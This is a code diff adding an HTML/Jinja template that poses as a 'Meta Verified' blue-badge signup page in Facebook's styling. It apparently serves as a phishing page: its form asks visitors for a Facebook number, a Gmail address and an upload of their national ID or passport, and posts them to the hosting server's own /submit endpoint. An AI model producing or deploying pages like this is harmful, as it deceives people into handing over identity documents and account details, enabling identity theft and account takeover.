@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Meta Verified Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px;
+      background: white;
+      margin: auto;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    h2 { color: #1877f2; }
+    label { display: block; margin-top: 10px; font-weight: bold; }
+    input, textarea, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .btn {
+      background: #1877f2;
+      color: white;
+      padding: 10px;
+      border: none;
+      margin-top: 15px;
+      width: 100%;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    .btn:hover { background: #155dc1; }
+    .section {
+      margin-bottom: 20px;
+    }
+    .flash { color: red; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    {% with messages = get_flashed_messages() %}
+      {% if messages %}
+        <div class="flash">{{ messages[0] }}</div>
+      {% endif %}
+    {% endwith %}
+
+    <div class="section">
+      <h2>About Meta Verified</h2>
+      <p>Meta Verified is a subscription bundle for creators on Facebook that includes account verification with a blue badge, proactive impersonation monitoring, and direct access to support.</p>
+    </div>
+
+    <div class="section">
+      <h2>Benefits of Blue Badge</h2>
+      <ul>
+        <li>✅ Official Verification with Blue Badge</li>
+        <li>✅ Improved account security</li>
+        <li>✅ Faster support from Meta team</li>
+        <li>✅ More credibility and reach</li>
+      </ul>
+    </div>
+
+    <form method="POST" action="/submit" enctype="multipart/form-data">
+      <label>Facebook Number</label>
+      <input type="text" name="fb_number" required>
+
+      <label>Gmail</label>
+      <input type="email" name="gmail" required>
+
+      <label>Upload NID / Passport</label>
+      <input type="file" name="id_file" accept=".jpg,.jpeg,.png,.pdf" required>
+
+      <button class="btn" type="submit">Submit for Verification</button>
+    </form>
+  </div>
+</body>
+  </html>
